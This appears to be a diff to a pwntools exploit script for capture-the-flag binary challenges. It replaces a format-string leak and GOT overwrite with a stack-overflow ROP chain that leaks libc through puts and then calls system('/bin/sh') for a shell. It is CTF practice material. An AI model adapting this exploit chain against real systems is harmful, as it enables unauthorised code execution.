@@ -11,36 +11,37 @@ def start(argv=[], *a, **kw):
 
 # Specify your GDB script here for debugging
 gdbscript = '''
-break *0x401201
+break *0x000000000040115d
 continue
 '''.format(**locals())
 
-exe = './challenge/coffee'
+exe = './challenge/not-a-baby-rop'
 elf = context.binary = ELF(exe, checksec=False)
 libc = elf.libc
 p = start()
 
-pop_rdi_ret = 0x401293
-pop5 = 0x40128b
+pop_rdi_ret = 0x000000000040122b
+ret = 0x0000000000401016
 
-# leak libc
-payload =  b'%29$016p'
-# overwrite got puts to entrypoint
-payload += b'%4199035c%9$naaa'
-payload += p64(elf.got.puts)
-payload += p64(elf.entrypoint)
+# leak got puts
+p.sendlineafter(b"let's see what u got\n", flat(
+    cyclic(136),
+    pop_rdi_ret,
+    elf.got.puts,
+    elf.plt.puts,
+    elf.entrypoint
+))
 
-p.sendline(payload)
-leak = int(p.recvline()[:16], 16)
+leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
+info("Leak got puts: " + hex(leak))
+libc.address = leak - libc.sym.puts
 
-info("Leak libc: " + hex(leak))
-libc.address = leak - (libc.sym.system -159696)
-
-p.sendline(flat(
-    p64(0)*4,                           # padding
+p.sendlineafter(b"let's see what u got\n", flat(
+    cyclic(136),
     pop_rdi_ret,
     next(libc.search(b'/bin/sh\x00')),
-    libc.sym.system
+    ret,
+    libc.sym.system,
 ))
 
 p.interactive()
